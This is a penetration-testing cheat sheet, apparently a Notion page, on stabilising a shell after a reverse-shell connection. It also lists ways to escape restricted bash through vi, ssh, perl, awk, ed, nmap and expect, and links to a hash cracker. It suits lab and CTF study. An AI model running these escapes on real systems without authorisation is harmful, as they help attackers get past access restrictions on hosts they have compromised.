# Breakouts

==============================================================================

[**S1REN's COMMON**](Breakouts%20aa384a6dbd3148b0a7253068e5543f23/S1REN's%20COMMON%2073a5b9df4b6c42d8a7c6643f8e065ab8.md)

[Reverse shells](Breakouts%20aa384a6dbd3148b0a7253068e5543f23/Reverse%20shells%2074e04dd93f214933b90684755c59128c.md)

[CVE’s](Breakouts%20aa384a6dbd3148b0a7253068e5543f23/CVE%E2%80%99s%2074afdf94a1084e348fc958f723029293.md)

[**Privilege Escalation**](Breakouts%20aa384a6dbd3148b0a7253068e5543f23/Privilege%20Escalation%209d59e4cc21814a8e8c6c9373eb9e336a.md)

[Tools](Breakouts%20aa384a6dbd3148b0a7253068e5543f23/Tools%20c933d5b016ca41a3bba9074c47715a3e.md)

[-rbash](Breakouts%20aa384a6dbd3148b0a7253068e5543f23/-rbash%2029cefa0bc95c46d78add7b66e67f2396.md)

===============================================================================

                                                                                [shell after a reverse shell connection]

===============================================================================

`shell after a reverse shell connection`

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
python -c 'import os; os.system("/bin/sh")'
```

`Set PATH TERM and SHELL if missing:`

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```bash
export TERM=xterm-256color;export SHELL=bash
```

```makefile
Out of the gate.

python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process.)
stty raw -echo ; fg ; reset
stty columns 200 rows 200

 

* Grab a valid tty.
* What OS are you on? Grab access to those binaries fast by exporting each environment variable. Debian/CentOS/FreeBSD
* Want a color terminal to easily tell apart file permissions? Directories? Files?
* Fastest way to list out the files in a directory, show size, show permissions, human readable.
* Make this shell stable.

Is this rbash (Restricted Bash)? PT1
$ vi
:set shell=/bin/sh
:shell

$ vim
:set shell=/bin/sh
:shell

Is this rbash (Restricted Bash)? PT2
(This requires ssh user-level access)
ssh user@127.0.0.1 "/bin/sh"
rm $HOME/.bashrc
exit
ssh user@127.0.0.1
(Bash Shell)

Is python present on the target machine?
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'

Is perl present on the target machine?
perl -e 'exec "/bin/bash";'
perl -e 'exec "/bin/sh";'

Is AWK present on the target machine?
awk 'BEGIN {system("/bin/bash -i")}'
awk 'BEGIN {system("/bin/sh -i")}'

Is ed present on the target machines?
ed
!sh

IRB Present on the target machine?
exec "/bin/sh"

Is Nmap present on the target machine?
nmap --interactive
nmap> !sh

Expect:

expect -v
  expect version 5.45.4
  
$ cat > /tmp/shell.sh <<EOF
#!/usr/bin/expect
spawn bash
interact
EOF

$ chmod u+x /tmp/shell.sh
$ /tmp/shell.sh
```

==================================================================================================

[Best Hash Cracker] [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)

---